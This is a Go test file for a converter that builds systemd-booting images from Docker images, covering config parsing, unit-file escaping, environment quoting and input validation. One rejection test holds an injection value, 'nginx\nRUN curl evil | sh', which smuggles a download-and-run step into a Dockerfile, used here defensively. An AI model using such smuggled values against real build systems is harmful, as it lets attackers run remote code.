package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// nginxConfig is `docker buildx imagetools inspect nginx --format
// '{{json .Image}}'`, cut down: a multi-platform image's configs by
// platform.
const nginxConfig = `{
  "linux/arm64": {"architecture": "arm64", "os": "linux", "config": {"Cmd": ["arm"]}},
  "linux/amd64": {
    "architecture": "amd64",
    "os": "linux",
    "config": {
      "ExposedPorts": {"80/tcp": {}},
      "Env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "NGINX_VERSION=1.27.5"],
      "Entrypoint": ["/docker-entrypoint.sh"],
      "Cmd": ["nginx", "-g", "daemon off;"],
      "StopSignal": "SIGQUIT"
    }
  }
}`

func TestParseImageConfig(t *testing.T) {
	cfg, err := parseImageConfig([]byte(nginxConfig))
	if err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(cfg.command(), "|"); got != "/docker-entrypoint.sh|nginx|-g|daemon off;" {
		t.Errorf("command = %q", got)
	}
	if cfg.StopSignal != "SIGQUIT" || len(cfg.Env) != 2 || len(cfg.ExposedPorts) != 1 {
		t.Errorf("config = %+v", cfg)
	}

	// A single-platform image is the config itself, not a map.
	cfg, err = parseImageConfig([]byte(`{"architecture": "amd64", "os": "linux", "config": {"User": "app", "Cmd": ["/srv/app"]}}`))
	if err != nil || cfg.User != "app" || len(cfg.Cmd) != 1 {
		t.Errorf("single-platform: %+v, %v", cfg, err)
	}

	for name, data := range map[string]string{
		"arm only":            `{"architecture": "arm64", "os": "linux", "config": {}}`,
		"no amd64 in the map": `{"linux/arm64": {"architecture": "arm64"}, "linux/386": {"architecture": "386"}}`,
		"not json":            `ERROR: not found`,
	} {
		if _, err := parseImageConfig([]byte(data)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestCommandSkipsABareShell(t *testing.T) {
	for _, c := range []containerConfig{
		{},
		{Cmd: []string{"bash"}},
		{Cmd: []string{"/bin/sh"}},
		{Entrypoint: []string{"/sbin/init"}},
	} {
		if argv := c.command(); argv != nil {
			t.Errorf("%+v: command %q, want none", c, argv)
		}
		if unit := containerService("x", c); unit != "" {
			t.Errorf("%+v: got a unit", c)
		}
	}
	// A shell running something is a command like any other.
	if argv := (containerConfig{Cmd: []string{"/bin/sh", "-c", "exec app"}}).command(); len(argv) != 3 {
		t.Errorf("sh -c: command %q", argv)
	}
}

func TestContainerService(t *testing.T) {
	cfg, err := parseImageConfig([]byte(nginxConfig))
	if err != nil {
		t.Fatal(err)
	}
	unit := containerService("nginx:1.27", cfg)
	for _, want := range []string{
		// $$: systemd would expand a single one itself.
		`ExecStart=/bin/bash -c "exec \"$$@\" > >(exec systemd-cat -t boxctl-container) 2>&1" boxctl-container "/docker-entrypoint.sh" "nginx" "-g" "daemon off;"` + "\n",
		"KillMode=mixed\n",
		`Environment="NGINX_VERSION=1.27.5"` + "\n",
		"Environment=HOME=/root\n",
		"KillSignal=SIGQUIT\n",
		"WantedBy=multi-user.target\n",
	} {
		if !strings.Contains(unit, want) {
			t.Errorf("unit lacks %q:\n%s", want, unit)
		}
	}
	if strings.Contains(unit, "User=") || strings.Contains(unit, "WorkingDirectory=") {
		t.Errorf("a root image with no WORKDIR got one:\n%s", unit)
	}

	unit = containerService("acme/api", containerConfig{
		User:       "1000:app",
		WorkingDir: "/srv",
		Env:        []string{"HOME=/srv", `MSG=say "hi" for $5 at 100%`, "not a variable", "1BAD=x"},
		Cmd:        []string{"python3", "-c", "print('$HOME')\nprint(\"100%\")"},
	})
	for _, want := range []string{
		"User=1000\n",
		"Group=app\n",
		"WorkingDirectory=/srv\n",
		// $ is literal in Environment=, % never is.
		`Environment="MSG=say \"hi\" for $5 at 100%%"` + "\n",
		`boxctl-container "python3" "-c" "print('$$HOME')\nprint(\"100%%\")"` + "\n",
	} {
		if !strings.Contains(unit, want) {
			t.Errorf("unit lacks %q:\n%s", want, unit)
		}
	}
	if strings.Contains(unit, "HOME=/root") || strings.Contains(unit, "BAD") || strings.Contains(unit, "not a variable") {
		t.Errorf("unit has an Environment it shouldn't:\n%s", unit)
	}
}

func TestContainerEnv(t *testing.T) {
	got := containerEnv("x", containerConfig{Env: []string{"PATH=/opt/bin:/usr/bin", "MSG=it's here", "bad name=1"}})
	for _, want := range []string{"export PATH='/opt/bin:/usr/bin'\n", `export MSG='it'\''s here'` + "\n"} {
		if !strings.Contains(got, want) {
			t.Errorf("env lacks %q:\n%s", want, got)
		}
	}
	if strings.Contains(got, "bad name") {
		t.Errorf("env exports an invalid name:\n%s", got)
	}
	if containerEnv("x", containerConfig{}) != "" {
		t.Error("an image with no ENV got a profile script")
	}
}

func TestRefName(t *testing.T) {
	for ref, want := range map[string]string{
		"nginx":                               "nginx",
		"nginx:1.27":                          "nginx",
		"ghcr.io/acme/api:1.2":                "api",
		"localhost:5000/team/My_App":          "my-app",
		"acme.jfrog.io/docker/svc@sha256:abc": "svc",
		"registry.example.com:443/a/b/c:tag":  "c",
	} {
		if got := refName(ref); got != want {
			t.Errorf("refName(%q) = %q, want %q", ref, got, want)
		}
	}
}

func TestConvertBuildsADockerfileFromTheImage(t *testing.T) {
	var bake struct {
		Target map[string]bakeTarget `json:"target"`
	}
	files := map[string]string{}
	var ran []string
	c := &converter{
		output: func(name string, args ...string) ([]byte, error) {
			ran = append(ran, name+" "+strings.Join(args, " "))
			return []byte(nginxConfig), nil
		},
		// The work directory is gone once convert returns, so read what it
		// handed Docker while the build "runs".
		run: func(name string, args ...string) error {
			ran = append(ran, name+" "+strings.Join(args, " "))
			data, err := os.ReadFile(args[3])
			if err != nil {
				return err
			}
			if err := json.Unmarshal(data, &bake); err != nil {
				return err
			}
			ctxDir := bake.Target["convert"].Context
			entries, err := os.ReadDir(ctxDir)
			if err != nil {
				return err
			}
			for _, e := range entries {
				content, err := os.ReadFile(filepath.Join(ctxDir, e.Name()))
				if err != nil {
					return err
				}
				files[e.Name()] = string(content)
			}
			return nil
		},
	}
	tar := filepath.Join(t.TempDir(), "rootfs.tar")
	err := c.convert(convertRequest{ref: "nginx:1.27", imagesDir: "../../images", tarOnly: tar})
	if err != nil {
		t.Fatal(err)
	}

	if len(ran) != 2 || ran[0] != "docker buildx imagetools inspect nginx:1.27 --format {{json .Image}}" ||
		!strings.HasSuffix(ran[1], "convert --set convert.output=type=tar,dest="+tar) {
		t.Fatalf("ran %q", ran)
	}
	target := bake.Target["convert"]
	if len(target.Platforms) != 1 || target.Platforms[0] != buildPlatform {
		t.Errorf("platforms = %v", target.Platforms)
	}
	if common := target.Contexts[commonContext]; !filepath.IsAbs(common) || filepath.Base(common) != "common" {
		t.Errorf("contexts = %v", target.Contexts)
	}
	want := `FROM nginx:1.27
USER root
SHELL ["/bin/sh", "-c"]
RUN command -v apt-get >/dev/null || { echo 'boxctl-image convert: nginx:1.27 has no apt-get -- only Debian- and Ubuntu-based images can be converted' >&2; exit 1; }
RUN find /etc/systemd/system -path '*.wants/*' -delete 2>/dev/null || true
RUN --mount=from=boxctl-common,target=/boxctl sh /boxctl/install.sh
COPY boxctl-container-env.sh /etc/profile.d/boxctl-container-env.sh
COPY boxctl-container.service /etc/systemd/system/boxctl-container.service
RUN systemctl enable boxctl-container.service
`
	if files[dockerfileName] != want {
		t.Errorf("Dockerfile:\n%s\nwant:\n%s", files[dockerfileName], want)
	}
	if !strings.Contains(files[containerUnit], "ExecStart=") || !strings.Contains(files[containerEnvFile], "export NGINX_VERSION=") {
		t.Errorf("context files: %v", files)
	}
}

func TestConvertNoService(t *testing.T) {
	var dockerfile string
	c := &converter{
		output: func(string, ...string) ([]byte, error) { return []byte(nginxConfig), nil },
		run: func(name string, args ...string) error {
			data, err := os.ReadFile(filepath.Join(filepath.Dir(args[3]), "context", dockerfileName))
			dockerfile = string(data)
			return err
		},
	}
	err := c.convert(convertRequest{
		ref: "nginx", imagesDir: "../../images", noService: true, tarOnly: filepath.Join(t.TempDir(), "x.tar"),
	})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(dockerfile, containerUnit) || strings.Contains(dockerfile, ".wants") || !strings.Contains(dockerfile, containerEnvFile) {
		t.Errorf("-no-service should drop the unit, keep the image's own units and keep the ENV:\n%s", dockerfile)
	}
}

func TestConvertRejects(t *testing.T) {
	c := &converter{
		output: func(string, ...string) ([]byte, error) { t.Fatal("reached the registry"); return nil, nil },
		run:    func(string, ...string) error { t.Fatal("ran a command"); return nil },
	}
	out := filepath.Join(t.TempDir(), "x.ext4")
	for name, req := range map[string]convertRequest{
		"a reference that ends the FROM line": {ref: "nginx\nRUN curl evil | sh", sizeMiB: 1024},
		"a reference with a space":            {ref: "nginx AS x", sizeMiB: 1024},
		"an empty reference":                  {ref: "", sizeMiB: 1024},
		"the build's own context name":        {ref: commonContext, sizeMiB: 1024},
		"a name that isn't one":               {ref: "nginx", name: "My Image", sizeMiB: 1024},
		"no size":                             {ref: "nginx"},
		"bigger than the smallest box disk":   {ref: "nginx", sizeMiB: smallestDiskMiB() + 1},
	} {
		req.imagesDir, req.out = "../../images", out
		if err := c.convert(req); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}
